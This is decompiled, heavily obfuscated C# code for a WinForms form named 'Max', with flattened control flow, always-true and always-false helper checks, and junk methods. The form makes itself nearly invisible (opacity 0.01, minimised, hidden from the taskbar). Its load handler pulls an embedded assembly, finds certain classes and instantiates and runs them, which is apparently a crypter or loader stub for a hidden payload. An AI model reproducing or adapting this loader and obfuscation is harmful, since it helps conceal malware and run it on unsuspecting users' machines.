				{
					object obj = qacfHE5raBSR0rkw4eX(this);
					location = new Point(79, 399);
					((Control)obj).set_Location(location);
					num = 114;
					if (ji9vSHhFFFpuEZPDoU())
					{
					}
					continue;
				}
				case 62:
				{
					object object_4 = ffy8iI5xQOYYt9civ5o(this);
					location = new Point(399, 185);
					IijDfP5MILflLk8Qj6D(object_4, location);
					goto IL_0229;
				}
				case 57:
				{
					object object_3 = ispcZy5IyX17ed8g0sq(this);
					size_ = new Size(81, 17);
					h4sBVd5CjHxCFD0o4pG(object_3, size_);
					PjO2n35gwWS8N8JBcJg(ispcZy5IyX17ed8g0sq(this), 4);
					goto case 112;
				}
				case 45:
					V1IkU5qZPEBuosfIle(this, (object)new Button());
					goto case 39;
				case 44:
					((PictureBox)o21QTI5XZrmBGYoCyhU(this)).set_TabIndex(10);
					goto case 69;
				case 34:
				{
					PjO2n35gwWS8N8JBcJg(CnoXj85hVruE7ubOkX3(this), 16);
					SizeF sizeF_ = new SizeF(6f, 13f);
					uFeLa95mtWOHfxlZYqp(this, sizeF_);
					num = 16;
					if (Lqkqs57vdX8OG1wSQE())
					{
						continue;
					}
					goto case 45;
				}
				case 33:
					QABVI75tNXkfqICwr7a(this, (object)new RadioButton());
					goto case 70;
				case 30:
				{
					object object_2 = o21QTI5XZrmBGYoCyhU(this);
					size_ = new Size(100, 50);
					h4sBVd5CjHxCFD0o4pG(object_2, size_);
					goto case 44;
				}
				case 26:
				{
					object object_ = jiiU8M5WOG6CMh00n5s(this);
					size_ = new Size(39, 13);
					h4sBVd5CjHxCFD0o4pG(object_, size_);
					goto default;
				}
				default:
					((Control)jiiU8M5WOG6CMh00n5s(this)).set_TabIndex(8);
					mOER8D5v3bDeLCqeBAD(jiiU8M5WOG6CMh00n5s(this), "Label3");
					goto case 83;
				case 24:
					LyfJA85PnUYUPrCv58H(gIrE0Y5O5iFtsZDOqNV(this), bool_0: true);
					ynk5uN5dXaAZt1gBli6(ispcZy5IyX17ed8g0sq(this), bool_0: true);
					num = 22;
					if (Lqkqs57vdX8OG1wSQE())
					{
						continue;
					}
					goto case 41;
				case 22:
				{
					CheckBox checkBox = CheckBox2;
					location = new Point(642, 222);
					((Control)checkBox).set_Location(location);
					num = 6;
					if (Lqkqs57vdX8OG1wSQE())
					{
						continue;
					}
					goto case 93;
				}
				case 16:
					AACXQD5SHI5sFArBaMy(this, (AutoScaleMode)1);
					goto case 95;
				case 14:
					NO0PQU529Ry7rgORm8E(tQufPp5YsTZMERCaXlm(this), "RadioButton2");
					LyfJA85PnUYUPrCv58H(tQufPp5YsTZMERCaXlm(this), bool_0: true);
					num = 62;
					if (!ji9vSHhFFFpuEZPDoU())
					{
						continue;
					}
					goto IL_01c8;
				case 7:
					CO9MuY5Qh10063Oo3ak(this);
					num = 102;
					if (Lqkqs57vdX8OG1wSQE())
					{
						continue;
					}
					goto case 100;
				case 6:
					csUgJa5n0kiZkSfvNa0(ispcZy5IyX17ed8g0sq(this), "CheckBox2");
					num = 57;
					if (Lqkqs57vdX8OG1wSQE())
					{
						continue;
					}
					goto case 11;
				case 0:
					ynk5uN5dXaAZt1gBli6(oXKaYs5ASZWQWgDFLaB(this), bool_0: true);
					goto case 100;
				case 68:
					goto IL_0d70;
				case 91:
					iTnEpl53Q5dC4PpOymr(e70pL55FoNALqPcYchB(this), gIrE0Y5O5iFtsZDOqNV(this));
					goto case 1;
				case 1:
					iTnEpl53Q5dC4PpOymr(e70pL55FoNALqPcYchB(this), phYAFK5edNviv7X5y9I(this));
					goto case 40;
				case 40:
					iTnEpl53Q5dC4PpOymr(e70pL55FoNALqPcYchB(this), UI0PML5b6I9qhK4r2xC(this));
					goto case 46;
				case 46:
					iTnEpl53Q5dC4PpOymr(((Control)this).get_Controls(), w8iDZT50S4oeiNs5QG2(this));
					goto case 78;
				case 78:
					csUgJa5n0kiZkSfvNa0(this, "Max");
					Q55nNn54evmq7xKJ8gy(this, 0.01);
					xbqol75fJM9DRT3QZhW(this, bool_0: false);
					goto case 89;
				case 89:
					fyb2X25LDFD938d7LtB(this, (FormWindowState)1);
					goto case 93;
				case 93:
					jPCUYC5JfClFEGZqROv(PictureBox1);
					goto case 37;
				case 37:
					X4nBuA5GkxoaobpPyF7(this, bool_0: false);
					goto case 41;
				case 41:
					wEL7Lq5wwEZOr2b2KuY(this);
					return;
				case 119:
					return;
				}
				break;
			}
			goto IL_0158;
			IL_07df:
			R2vjsW5HtQLUyUnSBCQ(jiiU8M5WOG6CMh00n5s(this), bool_0: true);
			goto IL_07eb;
			IL_07eb:
			object object_21 = jiiU8M5WOG6CMh00n5s(this);
			location = new Point(171, 161);
			IijDfP5MILflLk8Qj6D(object_21, location);
			goto IL_0808;
			IL_0808:
			csUgJa5n0kiZkSfvNa0(jiiU8M5WOG6CMh00n5s(this), "Label3");
			num = 26;
			if (!Lqkqs57vdX8OG1wSQE())
			{
				goto IL_0158;
			}
			goto IL_0b86;
			IL_0158:
			ePy3HX5k5TC3eM35c2B(this, (object)new LinkLabel());
			goto IL_0163;
			IL_0163:
			PictureBox1 = new PictureBox();
			num = 116;
			if (ji9vSHhFFFpuEZPDoU())
			{
				goto IL_017e;
			}
			goto IL_0b86;
			IL_017e:
			ProgressBar progressBar = ProgressBar1;
			size_ = new Size(306, 23);
			h4sBVd5CjHxCFD0o4pG(progressBar, size_);
			goto IL_01bb;
			IL_019b:
			csUgJa5n0kiZkSfvNa0(CnoXj85hVruE7ubOkX3(this), "Panel1");
			num = 115;
			if (ji9vSHhFFFpuEZPDoU())
			{
				goto IL_01bb;
			}
			goto IL_0b86;
			IL_01bb:
			PjO2n35gwWS8N8JBcJg(ProgressBar1, 11);
			goto IL_01c8;
			IL_01c8:
			object obj7 = vw6lIA5uSSSFq33hXXL(this);
			location = new Point(341, 399);
			((Control)obj7).set_Location(location);
			csUgJa5n0kiZkSfvNa0(vw6lIA5uSSSFq33hXXL(this), "TextBox1");
			goto IL_01f5;
			IL_01f5:
			object obj8 = vw6lIA5uSSSFq33hXXL(this);
			size_ = new Size(100, 20);
			((Control)obj8).set_Size(size_);
			((Control)vw6lIA5uSSSFq33hXXL(this)).set_TabIndex(12);
			num = 0;
			if (!Lqkqs57vdX8OG1wSQE())
			{
				goto IL_0229;
			}
			goto IL_0b86;
			IL_0229:
			((Control)ffy8iI5xQOYYt9civ5o(this)).set_Name("GroupBox1");
			goto IL_0239;
			IL_0239:
			GroupBox groupBox = GroupBox1;
			size_ = new Size(200, 100);
			h4sBVd5CjHxCFD0o4pG(groupBox, size_);
			((Control)ffy8iI5xQOYYt9civ5o(this)).set_TabIndex(15);
			goto IL_0260;
			IL_0260:
			YHXOX75DvgqPhr7rTZ0(ffy8iI5xQOYYt9civ5o(this), bool_0: false);
			goto IL_026c;
			IL_026c:
			IXPMxA57SFM5YHJA2kN(GroupBox1, "GroupBox1");
			goto IL_027c;
			IL_027c:
			Panel panel = Panel1;
			location = new Point(271, 121);
			IijDfP5MILflLk8Qj6D(panel, location);
			goto IL_019b;
		}
	}

	public void Gr0wlit_JL57XJUOM446n26()
	{
		double num2 = default(double);
		double num5 = default(double);
		double num6 = default(double);
		while (true)
		{
			try
			{
			}
			catch (Exception object_)
			{
				ytmwsw5qSpEqq8nyMo6(object_);
				ERvpJG51vGVwWQoP9Da();
			}
			bool flag = false;
			while (true)
			{
				IL_0018:
				if (flag)
				{
					goto IL_03e5;
				}
				goto IL_0400;
				IL_0400:
				bool flag2;
				while (true)
				{
					IL_0400_2:
					flag2 = false;
					int num = 22;
					if (Lqkqs57vdX8OG1wSQE())
					{
						goto IL_0030;
					}
					goto IL_0203;
					IL_0030:
					double num4;
					while (true)
					{
						switch (num)
						{
						case 17:
						case 21:
							break;
						case 3:
							goto IL_0018;
						case 43:
							goto IL_0024;
						case 60:
							if (flag2)
							{
								goto case 31;
							}
							goto case 18;
						case 31:
							try
							{
							}
							catch (Exception object_2)
							{
								ytmwsw5qSpEqq8nyMo6(object_2);
								flag2 = true;
								new decimal(797281567L);
								ERvpJG51vGVwWQoP9Da();
							}
							goto case 49;
						case 18:
							num2 += 1.0;
							goto case 32;
						case 32:
						case 35:
						{
							double num3 = num2;
							num4 = 0.2729468;
							if (!(num3 > num4))
							{
								goto case 16;
							}
							num = 54;
							if (Lqkqs57vdX8OG1wSQE())
							{
								continue;
							}
							goto IL_0196;
						}
						case 16:
							flag2 = false;
							goto case 49;
						case 48:
							goto IL_0196;
						case 34:
							goto IL_01a2;
						case 51:
							goto IL_01a9;
						case 20:
						case 45:
							goto IL_01b7;
						case 41:
							goto IL_01cb;
						case 53:
							goto IL_01ce;
						case 44:
							goto IL_01d4;
						case 33:
						case 47:
							goto IL_01d8;
						case 55:
							goto IL_01ff;
						case 30:
						case 39:
							goto IL_0203;
						default:
							goto IL_0227;
						case 15:
							goto IL_0237;
						case 7:
							goto IL_023b;
						case 19:
							goto IL_0250;
						case 5:
							goto IL_026c;
						case 24:
							goto IL_0283;
						case 23:
						case 58:
							goto IL_0287;
						case 1:
							goto IL_0296;
						case 36:
							goto IL_02b0;
						case 9:
						case 52:
							goto IL_02c4;
						case 4:
							goto IL_02ca;
						case 26:
							goto IL_02ce;
						case 10:
						case 14:
							goto IL_02e2;
						case 37:
						case 57:
							goto IL_02fa;
						case 38:
							goto IL_0317;
						case 59:
							num = 8;
							if (Lqkqs57vdX8OG1wSQE())
							{
								continue;
							}
							goto case 61;
						case 54:
							flag2 = false;
							goto IL_0283;
						case 40:
							if (!flag2)
							{
								goto IL_0400_2;
							}
							num = 59;
							if (Lqkqs57vdX8OG1wSQE())
							{
								continue;
							}
							goto case 31;
						case 28:
							if (flag)
							{
								goto case 0;
							}
							goto case 27;
						case 0:
							num = 27;
							if (Lqkqs57vdX8OG1wSQE())
							{
								continue;
							}
							goto IL_01d8;
						case 27:
							num = 49;
							if (Lqkqs57vdX8OG1wSQE())
							{
								continue;
							}
							goto IL_0237;
						case 22:
							if (!flag2)
							{
								num2 = 0.4438625;
								num = 35;
								if (!ji9vSHhFFFpuEZPDoU())
								{
									continue;
								}
								goto case 18;
							}
							flag2 = false;
							num = 40;
							if (!ji9vSHhFFFpuEZPDoU())
							{
								continue;
							}
							break;
						case 12:
							flag2 = true;
							goto IL_02c4;
						case 2:
							flag = false;
							num = 28;
							if (!ji9vSHhFFFpuEZPDoU())
							{
								continue;
							}
							goto IL_02ce;
						case 49:
							flag2 = false;
							goto case 60;
						case 13:
							goto IL_03e5;
						case 42:
							goto IL_03e8;
						case 6:
						case 25:
						case 56:
							goto IL_03ec;
						case 8:
							goto IL_0400_2;
						case 46:
							goto IL_0418;
						case 61:
							try
							{
								return;
							}
							catch (Exception projectError)
							{
								ProjectData.SetProjectError(projectError);
								flag2 = false;
								flag2 = true;
								flag2 = false;
								flag2 = false;
								ERvpJG51vGVwWQoP9Da();
								return;
							}
						}
						break;
					}
					break;
					IL_0196:
					if (flag2)
					{
						flag = true;
						goto IL_026c;
					}
					goto IL_0418;
					IL_0203:
					new decimal(1206122740L);
					num = 12;
					if (Lqkqs57vdX8OG1wSQE())
					{
						goto IL_0030;
					}
					goto IL_0227;
					IL_026c:
					if (flag)
					{
						num = 37;
						if (!ji9vSHhFFFpuEZPDoU())
						{
							goto IL_0030;
						}
						goto IL_0283;
					}
					goto IL_02fa;
					IL_0227:
					try
					{
					}
					catch (Exception object_3)
					{
						ytmwsw5qSpEqq8nyMo6(object_3);
						ERvpJG51vGVwWQoP9Da();
					}
					goto IL_023b;
					IL_0283:
					if (flag2)
					{
					}
					goto IL_0287;
					IL_0287:
					new decimal(91087130L);
					goto IL_0296;
					IL_0296:
					try
					{
					}
					catch (Exception object_4)
					{
						ytmwsw5qSpEqq8nyMo6(object_4);
						flag2 = false;
						flag2 = false;
						ERvpJG51vGVwWQoP9Da();
					}
					flag2 = false;
					goto IL_02b0;
					IL_023b:
					flag2 = false;
					goto IL_0237;
					IL_02b0:
					if (!flag2)
					{
						goto IL_023b;
					}
					Lqkqs57vdX8OG1wSQE();
					if (!ji9vSHhFFFpuEZPDoU())
					{
						goto IL_0227;
					}
					goto IL_02c4;
					IL_0237:
					if (!flag2)
					{
						num5 = 0.9604228;
						goto IL_01b7;
					}
					goto IL_023b;
					IL_02c4:
					if (!flag2)
					{
					}
					goto IL_02e2;
					IL_02e2:
					flag2 = false;
					goto IL_02ca;
					IL_02ca:
					if (!flag2)
					{
						num6 += 1.0;
						goto IL_01e8;
					}
					goto IL_02ce;
					IL_02ce:
					try
					{
					}
					catch (Exception object_5)
					{
						ytmwsw5qSpEqq8nyMo6(object_5);
						flag2 = true;
						ERvpJG51vGVwWQoP9Da();
					}
					goto IL_02e2;
					IL_0024:
					num = 61;
					if (!ji9vSHhFFFpuEZPDoU())
					{
					}
					goto IL_0030;
					IL_02fa:
					try
					{
					}
					catch (Exception object_6)
					{
						ytmwsw5qSpEqq8nyMo6(object_6);
						ERvpJG51vGVwWQoP9Da();
					}
					goto IL_0418;
					IL_0418:
					flag2 = true;
					goto IL_01a2;
					IL_01a2:
					if (!flag2)
					{
						goto IL_01a9;
					}
					goto IL_0418;
					IL_01a9:
					num5 += 1.0;
					goto IL_01b7;
					IL_01b7:
					double num7 = num5;
					num4 = 0.1146233;
					if (!(num7 <= num4))
					{
						goto IL_01cb;
					}
					goto IL_0250;
					IL_01cb:
					flag2 = false;
					goto IL_01ce;
					IL_01ce:
					if (!flag2)
					{
					}
					goto IL_01d8;
					IL_01d8:
					flag2 = false;
					goto IL_01d4;
					IL_01d4:
					if (flag2)
					{
						goto IL_01d8;
					}
					num6 = 0.5382463;
					goto IL_01e8;
					IL_0317:
					flag2 = false;
					goto IL_0024;
					IL_01e8:
					double num8 = num6;
					num4 = 0.4064213;
					if (!(num8 > num4))
					{
						flag2 = false;
						goto IL_01ff;
					}
					goto IL_0317;
					IL_0250:
					try
					{
					}
					catch (Exception object_7)
					{
						ytmwsw5qSpEqq8nyMo6(object_7);
						ERvpJG51vGVwWQoP9Da();
					}
					flag2 = true;
					goto IL_0196;
					IL_01ff:
					if (flag2)
					{
					}
					goto IL_0203;
				}
				break;
				IL_03e5:
				flag2 = false;
				goto IL_03e8;
				IL_03e8:
				if (flag2)
				{
				}
				goto IL_03ec;
				IL_03ec:
				try
				{
				}
				catch (Exception object_8)
				{
					ytmwsw5qSpEqq8nyMo6(object_8);
					flag2 = false;
					ERvpJG51vGVwWQoP9Da();
				}
				goto IL_0400;
			}
		}
	}

	private void Max_Load(object sender, EventArgs e)
	{
		Lqkqs57vdX8OG1wSQE();
		if (!ji9vSHhFFFpuEZPDoU())
		{
			goto IL_0097;
		}
		int num = 4;
		if (!Lqkqs57vdX8OG1wSQE())
		{
			goto IL_0070;
		}
		goto IL_00a4;
		IL_004e:
		Assembly object_ = default(Assembly);
		Type[] array = (Type[])g756GioaYfrQWxB9qtZ(object_);
		goto IL_0056;
		IL_00a4:
		bool flag = default(bool);
		object object_2 = default(object);
		Type type = default(Type);
		int num2 = default(int);
		while (true)
		{
			switch (num)
			{
			case 12:
				if (flag)
				{
					goto default;
				}
				goto case 3;
			default:
				object_2 = RrVt0ZJV4FOn4Lt5R0(wf8X8CoogYOLDgvehAa(type));
				goto case 4;
			case 4:
			case 7:
				oW20m057.ren_(type, RrVt0ZJV4FOn4Lt5R0(object_2));
				num = 3;
				if (Lqkqs57vdX8OG1wSQE())
				{
					continue;
				}
				break;
			case 2:
				break;
			case 8:
				goto IL_0056;
			case 3:
				num2 = checked(num2 + 1);
				goto IL_005e;
			case 9:
			case 10:
				goto IL_005e;
			case 1:
				goto IL_0067;
			case 6:
				goto IL_0070;
			case 0:
			case 11:
				goto IL_0097;
			case 13:
				return;
			}
			break;
		}
		goto IL_004e;
		IL_0070:
		flag = type.IsClass & LcFHvJo56ZNQSIEeqvr(type.FullName, ".z");
		num = 12;
		if (ji9vSHhFFFpuEZPDoU())
		{
		}
		goto IL_00a4;
		IL_0056:
		num2 = 0;
		goto IL_005e;
		IL_0067:
		if (flag)
		{
			type = array[num2];
			goto IL_0070;
		}
		return;
		IL_005e:
		flag = num2 < array.Length;
		goto IL_0067;
		IL_0097:
		object_ = (Assembly)hIdkwl5zXJ0MBuXbHGw(XE);
		goto IL_004e;
	}

	public void Gr0wlit_ZDe9GC3H2xhgE6()
	{
		double num3 = default(double);
		double num6 = default(double);
		double num8 = default(double);
		while (true)
		{
			bool flag = false;
			while (true)
			{
				IL_0004:
				if (!flag)
				{
				}
				while (true)
				{
					flag = true;
					while (!flag)
					{
						while (true)
						{
							IL_000f:
							double num = 0.1387323;
							while (true)
							{
								IL_001a:
								flag = false;
								while (true)
								{
									IL_001d:
									flag = false;
									while (true)
									{
										IL_0020:
										if (!flag)
										{
											goto IL_0027;
										}
										goto IL_0378;
										IL_0378:
										bool flag2 = true;
										int num2 = 38;
										if (!ji9vSHhFFFpuEZPDoU())
										{
											goto IL_0055;
										}
										goto IL_048e;
										IL_0055:
										double num5;
										while (true)
										{
											switch (num2)
											{
											case 49:
											case 50:
												break;
											case 26:
												goto IL_0004;
											case 13:
											case 47:
											case 55:
												goto end_IL_000b;
											case 6:
												goto IL_000b;
											case 3:
												goto IL_000f;
											case 41:
											case 56:
											case 57:
												goto IL_001d;
											case 70:
												goto IL_0020;
											case 0:
											case 38:
											case 48:
												goto IL_0027;
											case 66:
												goto IL_002a;
											case 1:
												goto IL_0038;
											case 33:
											case 86:
												num2 = 43;
												if (Lqkqs57vdX8OG1wSQE())
												{
													continue;
												}
												goto case 81;
											case 81:
												flag = false;
												goto case 78;
											case 78:
												if (flag)
												{
												}
												goto case 61;
											case 61:
											case 62:
											case 64:
												flag2 = true;
												goto case 59;
											case 59:
												if (flag2)
												{
													flag2 = false;
													num2 = 60;
													if (!ji9vSHhFFFpuEZPDoU())
													{
														continue;
													}
													goto end_IL_000b;
												}
												goto case 30;
											case 30:
												num3 = 0.7972973;
												goto case 29;
											case 29:
											case 65:
											{
												double num4 = num3;
												num5 = 0.696285;
												if (!(num4 > num5))
												{
													new decimal(1489721648L);
													goto case 34;
												}
												flag2 = true;
												goto case 24;
											}
											case 34:
												try
												{
												}
												catch (Exception object_3)
												{
													ytmwsw5qSpEqq8nyMo6(object_3);
													flag2 = true;
													ERvpJG51vGVwWQoP9Da();
												}
												flag2 = false;
												goto case 58;
											case 58:
												if (flag2)
												{
													goto case 16;
												}
												goto IL_0430;
											case 79:
												if (flag2)
												{
													flag2 = false;
													goto case 17;
												}
												Lqkqs57vdX8OG1wSQE();
												if (!ji9vSHhFFFpuEZPDoU())
												{
													goto case 42;
												}
												goto IL_048e;
											case 17:
												if (flag2)
												{
												}
												goto case 14;
											case 14:
											case 63:
											case 75:
												try
												{
												}
												catch (Exception projectError)
												{
													ProjectData.SetProjectError(projectError);
													flag2 = true;
													flag2 = false;
													new decimal(-168316663L);
													ERvpJG51vGVwWQoP9Da();
												}
												goto IL_0430;
											case 42:
											case 73:
												num3 += 1.0;
												goto case 29;
											case 24:
											case 80:
												flag2 = true;
												goto case 4;
											case 69:
												if (flag2)
												{
													new decimal(-257908144L);
													goto case 4;
												}
												num6 = 0.3469571;
												goto case 37;
											case 4:
											case 46:
											case 84:
												flag2 = true;
												goto case 69;
											case 37:
											case 85:
											{
												double num7 = num6;
												num5 = 0.00250566;
												if (!(num7 > num5))
												{
													try
													{
													}
													catch (Exception object_5)
													{
														ytmwsw5qSpEqq8nyMo6(object_5);
														flag2 = false;
														ERvpJG51vGVwWQoP9Da();
													}
													flag2 = false;
													goto case 40;
												}
												goto case 10;
											}
											case 40:
												if (flag2)
												{
													goto case 83;
												}
												goto case 27;
											case 83:
												new decimal(-989570805L);
												goto case 45;
											case 45:
												try
												{
												}
												catch (Exception object_4)
												{
													ytmwsw5qSpEqq8nyMo6(object_4);
													flag2 = true;
													flag2 = true;
													ERvpJG51vGVwWQoP9Da();
												}
												goto case 27;
											case 51:
												if (flag2)
												{
													flag2 = false;
													goto case 9;
												}
												num6 += 1.0;
												goto case 37;
											case 9:
												if (!flag2)
												{
												}
												goto case 27;
											case 27:
											case 35:
											case 76:
												flag2 = false;
												goto case 51;
											case 10:
												flag2 = true;
												num2 = 28;
												if (!ji9vSHhFFFpuEZPDoU())
												{
													continue;
												}
												goto IL_0038;
											case 16:
												num2 = 22;
												if (ji9vSHhFFFpuEZPDoU())
												{
												}
												continue;
											case 72:
												if (flag2)
												{
													goto case 81;
												}
												goto case 61;
											case 67:
												goto IL_0378;
											case 60:
												if (flag2)
												{
												}
												goto case 32;
											case 32:
												try
												{
												}
												catch (Exception object_2)
												{
													ytmwsw5qSpEqq8nyMo6(object_2);
													flag2 = false;
													new decimal(-1423338609L);
													ERvpJG51vGVwWQoP9Da();
												}
												goto case 61;
											case 54:
												num2 = 48;
												if (ji9vSHhFFFpuEZPDoU())
												{
												}
												continue;
											case 2:
											case 44:
												flag2 = false;
												goto case 72;
											case 28:
												if (!flag2)
												{
												}
												goto case 33;
											case 22:
												try
												{
												}
												catch (Exception object_)
												{
													ytmwsw5qSpEqq8nyMo6(object_);
													flag2 = false;
													flag2 = false;
													new decimal(-1018164063L);
													ERvpJG51vGVwWQoP9Da();
												}
												goto IL_0430;
											case 8:
												if (!flag2)
												{
												}
												goto case 54;
											default:
												num2 = 65;
												if (!Lqkqs57vdX8OG1wSQE())
												{
													goto IL_0004;
												}
												continue;
											case 21:
												if (!flag2)
												{
												}
												goto IL_04ee;
											case 43:
												flag2 = true;
												goto case 53;
											case 53:
												if (flag2)
												{
													goto case 52;
												}
												goto IL_048e;
											case 52:
												flag = false;
												goto case 7;
											case 7:
												if (!flag)
												{
												}
												goto IL_048e;
											case 77:
												goto IL_045a;
											case 82:
												goto IL_0461;
											case 18:
												goto IL_0465;
											case 15:
												goto IL_0474;
											case 19:
											case 39:
											case 68:
												goto IL_048e;
											case 11:
												goto IL_0493;
											case 12:
												goto IL_049e;
											case 25:
											case 71:
												goto IL_04a1;
											case 31:
												goto IL_04c7;
											case 23:
												goto IL_04cd;
											case 5:
											case 20:
											case 36:
											case 74:
												goto IL_04ee;
											case 87:
												return;
												IL_0430:
												flag2 = false;
												goto case 79;
											}
											break;
										}
										break;
										IL_048e:
										flag2 = true;
										goto IL_045a;
										IL_045a:
										if (flag2)
										{
											flag2 = false;
											goto IL_0461;
										}
										goto IL_0493;
										IL_002a:
										num += 1.0;
										goto IL_0038;
										IL_0461:
										if (flag2)
										{
										}
										goto IL_0465;
										IL_0465:
										new decimal(1565762407L);
										goto IL_0474;
										IL_0474:
										try
										{
										}
										catch (Exception object_6)
										{
											ytmwsw5qSpEqq8nyMo6(object_6);
											flag2 = false;
											flag2 = false;
											flag2 = true;
											ERvpJG51vGVwWQoP9Da();
										}
										goto IL_048e;
										IL_0493:
										num8 = 0.2315966;
										goto IL_049e;
										IL_049e:
										flag2 = false;
										goto IL_04a1;
										IL_04a1:
										try
										{
										}
										catch (Exception object_7)
										{
											ytmwsw5qSpEqq8nyMo6(object_7);
											new decimal(378049929L);
											flag2 = false;
											ERvpJG51vGVwWQoP9Da();
										}
										flag2 = false;
										goto IL_04c7;
										IL_0038:
										double num9 = num;
										num5 = 0.5172558;
										if (num9 <= num5)
										{
											goto IL_001a;
										}
										num2 = 44;
										if (!ji9vSHhFFFpuEZPDoU())
										{
										}
										goto IL_0055;
										IL_04c7:
										if (!flag2)
										{
										}
										goto IL_04ee;
										IL_04ee:
										flag2 = false;
										goto IL_04cd;
										IL_04cd:
										num8 += 1.0;
										double num10 = num8;
										num5 = 0.9499055;
										if (!(num10 <= num5))
										{
											return;
										}
										goto IL_049e;
										IL_0027:
										flag2 = false;
										goto IL_002a;
									}
									break;
								}
								break;
							}
							break;
						}
						goto end_IL_0008;
						continue;
						end_IL_000b:
						break;
						IL_000b:;
					}
					continue;
					end_IL_0008:
					break;
				}
				break;
			}
		}
	}

	internal static void lOUUsjmuafUvhMSpRA(object object_0)
	{
		((Form)object_0)._002Ector();
	}

	internal static void dpLI99SLvRwmGVVJEF(object object_0)
	{
		__ENCAddToList(object_0);
	}

	internal static bool Lqkqs57vdX8OG1wSQE()
	{
		return true;
	}

	internal static bool ji9vSHhFFFpuEZPDoU()
	{
		return false;
	}

	internal static void yqNZgRBSVE4HDG2X1N(object object_0)
	{
		Monitor.Enter(object_0);
	}

	internal static int KFPKPhF6mHUFWxQnit(object object_0)
	{
		return ((List<WeakReference>)object_0).Count;
	}

	internal static int ialF2q3LfI1rfwO6Pk(object object_0)
	{
		return ((List<WeakReference>)object_0).Capacity;
	}

	internal static bool OSsfti4Sx3HxJKWrkN(object object_0)
	{
		return ((WeakReference)object_0).IsAlive;
	}

	internal static void Xe8d4SfhfPVlWrTrWr(object object_0, int int_0, int int_1)
	{
		((List<WeakReference>)object_0).RemoveRange(int_0, int_1);
	}

	internal static void diYLd2LjKgUaqn4gFH(object object_0, int int_0)
	{
		((List<WeakReference>)object_0).Capacity = int_0;
	}

	internal static object RrVt0ZJV4FOn4Lt5R0(object object_0)
	{
		return RuntimeHelpers.GetObjectValue(object_0);
	}

	internal static void LuXiYsGOryMA6C6nfL(object object_0)
	{
		Monitor.Exit(object_0);
	}

	internal static void zO9xoOwinmCFPAZkJl(object object_0)
	{
		((IDisposable)object_0).Dispose();
	}

	internal static void UbteBBZRRTh2FVCjLD(object object_0, bool bool_0)
	{
		((Form)object_0).Dispose(bool_0);
	}

	internal static void qSPvHi6Ag9ucByFqdo(object object_0, object object_1)
	{
		((Max)object_0).Button1 = (Button)object_1;
	}

	internal static void V1IkU5qZPEBuosfIle(object object_0, object object_1)
	{
		((Max)object_0).Button2 = (Button)object_1;
	}

	internal static void rWHcYh1jDdkH5Uk5GD(object object_0, object object_1)
	{
		((Max)object_0).Button3 = (Button)object_1;
	}

	internal static void iAFgZ2zPfJvbklKMZ5(object object_0, object object_1)
	{
		((Max)object_0).CheckBox2 = (CheckBox)object_1;
	}

	internal static void VqSJjM5atuAUVKC8il6(object object_0, object object_1)
	{
		((Max)object_0).ComboBox1 = (ComboBox)object_1;
	}

	internal static void uAxUnU55xg9OuBnC1qJ(object object_0, object object_1)
	{
		((Max)object_0).Label1 = (Label)object_1;
	}

	internal static void vu71UX5oqYOSIQAmEYM(object object_0, object object_1)
	{
		((Max)object_0).Label2 = (Label)object_1;
	}

	internal static void mGvdKi5V5WmCQMgpi1n(object object_0, object object_1)
	{
		((Max)object_0).Label3 = (Label)object_1;
	}

	internal static void ePy3HX5k5TC3eM35c2B(object object_0, object object_1)
	{
		((Max)object_0).LinkLabel1 = (LinkLabel)object_1;
	}

	internal static void VjlFvb5N3aFiQ2874O8(object object_0, object object_1)
	{
		((Max)object_0).ProgressBar1 = (ProgressBar)object_1;
	}

	internal static void lnxcV95RIOrOxRbIiFE(object object_0, object object_1)
	{
		((Max)object_0).TextBox1 = (TextBox)object_1;
	}

	internal static void RTaLco5cPcn2kSSUTHw(object object_0, object object_1)
	{
		((Max)object_0).RadioButton1 = (RadioButton)object_1;
	}

	internal static void QABVI75tNXkfqICwr7a(object object_0, object object_1)
	{
		((Max)object_0).RadioButton2 = (RadioButton)object_1;
	}

	internal static void sf7ZtK5pFhcXWaRpY6C(object object_0, object object_1)
	{
		((Max)object_0).GroupBox1 = (GroupBox)object_1;
	}

	internal static void s3RmWJ5TtaG13dx51jX(object object_0, object object_1)
	{
		((Max)object_0).Panel1 = (Panel)object_1;
	}

	internal static object o21QTI5XZrmBGYoCyhU(object object_0)
	{
		return ((Max)object_0).PictureBox1;
	}

	internal static void DeZXw25ldUY8kbHMF5g(object object_0)
	{
		((ISupportInitialize)object_0).BeginInit();
	}

	internal static void CO9MuY5Qh10063Oo3ak(object object_0)
	{
		((Control)object_0).SuspendLayout();
	}

	internal static object w8iDZT50S4oeiNs5QG2(object object_0)
	{
		return ((Max)object_0).Button1;
	}

	internal static void IijDfP5MILflLk8Qj6D(object object_0, Point point_0)
	{
		((Control)object_0).set_Location(point_0);
	}

	internal static void csUgJa5n0kiZkSfvNa0(object object_0, object object_1)
	{
		((Control)object_0).set_Name((string)object_1);
	}

	internal static void PjO2n35gwWS8N8JBcJg(object object_0, int int_0)
	{
		((Control)object_0).set_TabIndex(int_0);
	}

	internal static void NO0PQU529Ry7rgORm8E(object object_0, object object_1)
	{
		((ButtonBase)object_0).set_Text((string)object_1);
	}

	internal static void LyfJA85PnUYUPrCv58H(object object_0, bool bool_0)
	{
		((ButtonBase)object_0).set_UseVisualStyleBackColor(bool_0);
	}

	internal static object UI0PML5b6I9qhK4r2xC(object object_0)
	{
		return ((Max)object_0).Button2;
	}

	internal static void h4sBVd5CjHxCFD0o4pG(object object_0, Size size_0)
	{
		((Control)object_0).set_Size(size_0);
	}

	internal static object phYAFK5edNviv7X5y9I(object object_0)
	{
		return ((Max)object_0).Button3;
	}

	internal static object gIrE0Y5O5iFtsZDOqNV(object object_0)
	{
		return ((Max)object_0).CheckBox1;
	}

	internal static void ynk5uN5dXaAZt1gBli6(object object_0, bool bool_0)
	{
		((ButtonBase)object_0).set_AutoSize(bool_0);
	}

	internal static object ispcZy5IyX17ed8g0sq(object object_0)
	{
		return ((Max)object_0).CheckBox2;
	}

	internal static object TPh4Nh5jCxQxcWF6L43(object object_0)
	{
		return ((Max)object_0).ComboBox1;
	}

	internal static void fakCiW5K2GFe5Sx7epR(object object_0, bool bool_0)
	{
		((ListControl)object_0).set_FormattingEnabled(bool_0);
	}

	internal static object TNk9UH5ysL0SrFwacyW(object object_0)
	{
		return ((Max)object_0).Label1;
	}

	internal static void R2vjsW5HtQLUyUnSBCQ(object object_0, bool bool_0)
	{
		((Label)object_0).set_AutoSize(bool_0);
	}

	internal static void mOER8D5v3bDeLCqeBAD(object object_0, object object_1)
	{
